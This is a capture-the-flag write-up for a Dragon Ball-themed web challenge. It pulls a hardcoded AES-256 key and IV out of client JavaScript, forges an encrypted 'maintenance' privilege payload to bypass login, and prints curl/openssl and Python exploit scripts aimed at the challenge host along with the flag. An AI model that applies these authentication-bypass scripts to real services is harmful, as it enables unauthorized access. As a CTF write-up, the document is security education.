Capsule Corp CTF — Write-Up

This one turned out to be a client-side crypto challenge dressed up as a Dragon Ball fan site. Everything you need to break it — the AES key, the IV, even the algorithm — is sitting right there in the JavaScript. The real trick isn't finding the crypto material, it's noticing that the server trusts a privilege field the _browser_ is allowed to set.

1. Poking Around First

Before touching anything, I just looked at what Burp had already picked up from browsing the site. 12 requests, most of them boring:

The page title is _"Capsule Corp. // カプセルコーポレーション — West City Mainframe."_ Response headers give away nginx in front of Express, so a Node backend.

The page itself is a single-page app with four tabs — a Dragon Radar animation, a gravity slider, some capsule cards, and a "Clearance Terminal" with a login form and a fake CLI. The CLI takes commands like help, radar, gravity<num> — all of it purely cosmetic, none of it talks to the server. The login form has two fields:

<input type="text" id="email" name="operator_id"
       placeholder="e.g. OP-7749 or bulma@capsulecorp.internal">
<input type="password" id="password" name="clearance_key"
       placeholder="••••••••••••">

No hidden comments, no juicy data-attributes, no robots.txt (it just 404s to the SPA catch-all). Nothing here — the real work is in the JS.

2. Reading Every JS File

There are eight JS files loaded. Most of them are noise, but two of them together hand you the entire attack.

polyfill.min.js — just standard Promise.allSettled / structuredClone shims. Skip.

validators.min.js — client-side form validation. Two things worth noting:

  • A password scorer that dings you for using words like capsule, bulma, password — a hint at the naming theme.
  • The expected auth token shape: /^v1\.[A-Za-z0-9+/=]{20,}\.[0-9a-f]{32}$/

Also a rate limiter capping login attempts at 5 per 60 seconds — client-side only, so it means nothing to anyone hitting the API directly.

vendor.min.js — this one's a trap. It's got a legacy XOR cipher sitting in plain sight:

Looks tempting, but it's never actually called anywhere in the auth flow. Real auth uses AES-CBC, defined elsewhere. I spent so much time finding where it was called.

analytics.min.js — also a trap, and a funnier one. Buried in the analytics config:

This was the first hit and it straight up tells you it's fake. "Not the real flag, Kakarot, keep looking." Fair enough.

runtime.a3f8d.js — now we're getting somewhere. This is where the AES key gets built, split across three deliberately obfuscated pieces so a plain grep won't catch it whole:


"sbaL_proCeluspa" reversed → "CapsuleCorp_Labs"
[84, 51, 99, 104, 75, 51, 121, 35] char codes → "T3chK3y#"
[57, 109, 80, 113, 50, 119, 88, 122] char codes → "9mPq2wXz"

Stitch those three pieces together and you get:

CapsuleCorp_LabsT3chK3y#9mPq2wXz

32 characters — that's an AES-256 key. LETS gooooooooooo !!!!!

chunk.9e2b1.js — the other critical file. This one has the IV, the API endpoints, and — this is the part that matters — the actual privilege model:

Some intresting stuff I found was:

var _ib = "Q2Fwc3VsZUNvcnBJVl8yNg==";
function _gi() { return atob(_ib); } // "CapsuleCorpIV_26"

var _T = {
    standard: 0,
    operator: 1,
    supervisor: 2,
    restricted: 3,
    maintenance: -2
};

And here's the payload the client builds before encrypting:

async function _mkPayload(username, password) {
    var obj = {
        username: username,
        password: password,
        tier: 1,
        access_mode: "standard",
        __priv: _T["standard"]  // 0
    };
    return await _xe(JSON.stringify(obj), _gk(), _gi());
}

Read that again. The browser decides what privilege tier it's asking for, encrypts that claim, and sends it. The server just... trusts it. That's the whole bug, right there, in plain view.

ui-kit.min.js and app.min.js — pure UI glue. Toasts, modals, tab switching. Nothing here.

curl -s -X POST http://35.238.206.98:6767/api/session \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
{"error": "bad_request"}

Good — confirms /api/session won't touch anything that isn't the AES-wrapped payload. So the encryption is genuinely required, but nothing stops _me_ from being the one doing the encrypting.

4. The Actual Vulnerability

Two things stacked on top of each other:

  1. The encryption is entirely client-side, key and all. Anything the JS can encrypt, I can encrypt — there's no secret the server holds that I don't also have.
  2. The server never re-checks the privilege claim inside the payload. tier, access_mode, and __priv are decided by whoever builds the plaintext. The server just decrypts and believes it.

Put together: I can hand the server any privilege level I want, wrapped in valid-looking ciphertext, and it has no way to tell the difference between that and a real login.

5. Exploiting It

First I tried the obvious thing — guessed creds at tier: 2 (supervisor): admin/admin, admin/admin at operator tier, dr.briefs@capsulecorp.local / capsule. All three came back 401. So supervisor and operator still actually check credentials. Fine.

But maintenance: -2 stood out — a _negative_ tier, sitting oddly apart from the neat 0–3 range of the others. Negative usually means "special case the developer bolted on and probably didn't think through." So I tried it, with completely made-up credentials:

{
    "username": "admin",
    "password": "admin",
    "tier": -2,
    "access_mode": "maintenance",
    "__priv": -2
}

Encrypted that with the extracted key/IV, sent it to /api/session, and got a 200:

{
    "status": "authenticated",
    "role": "engineering",
    "session": "62a76bec41a9ff1b7837e3c7d12810fc08bb7b4dae90b44f59fbd9b4d79f95b1",
    "data": {
        "user": {"id": "cc-eng-1", "display": "Engineering Access", "tier": 99},
        "workspace": "capsulecorp-engineering",
        "access_token": "BSides_Mumbai{c4psul3_c0rp_3ng_0v3rr1d3_4es_cbc_pr1v_m1nus_tw0}",
        "expires_in": 3600
    }
}

Turns out maintenance skips credential checking entirely — username and password can be anything. The server just sees __priv: -2, hands over tier-99 engineering access, and drops the flag straight into access_token.

6. The Flag

BSides_Mumbai{c4psul3_c0rp_3ng_0v3rr1d3_4es_cbc_pr1v_m1nus_tw0}

("Capsule Corp eng override, AES CBC, priv minus two" — read it out loud, it's a sentence.)

7. How and what I did

You need something that can do AES-256-CBC with a raw key/IV. Here's a pure curl + openssl version — no Python needed:

# Derive the key and IV extracted from runtime.a3f8d.js and chunk.9e2b1.js
KEY_HEX=$(printf '%s' "CapsuleCorp_LabsT3chK3y#9mPq2wXz" | xxd -p -c 256)
IV_HEX=$(printf '%s' "CapsuleCorpIV_26" | xxd -p -c 256)

# The privilege claim that skips credential checking entirely
PAYLOAD='{"username":"anything","password":"anything","tier":-2,"access_mode":"maintenance","__priv":-2}'

# AES-256-CBC encrypt with PKCS7 padding, then base64 the ciphertext
ENC_B64=$(printf '%s' "$PAYLOAD" | openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -a -A)

# Fire it at the session endpoint
curl -s -X POST http://35.238.206.98:6767/api/session \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "{\"payload\":\"$ENC_B64\"}" | jq

Same thing in Python, if you'd rather not rely on openssl enc's CLI quirks:

import json
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests

key = b"CapsuleCorp_LabsT3chK3y#9mPq2wXz"
iv  = b"CapsuleCorpIV_26"

payload = json.dumps({
    "username": "anything",
    "password": "anything",
    "tier": -2,
    "access_mode": "maintenance",
    "__priv": -2
})

cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(payload.encode(), AES.block_size))
b64 = b64encode(ct).decode()

r = requests.post(
    "http://35.238.206.98:6767/api/session",
    json={"payload": b64},
    headers={"X-Requested-With": "XMLHttpRequest"}
)
print(r.json()["data"]["access_token"])

Either way, the response lands the flag in data.access_token.

Takeaway

If your "encryption" runs entirely in the browser and the server never checks what's actually inside the decrypted payload, you don't have authentication — you have a very elaborate way of asking the client nicely what access level it would like today.
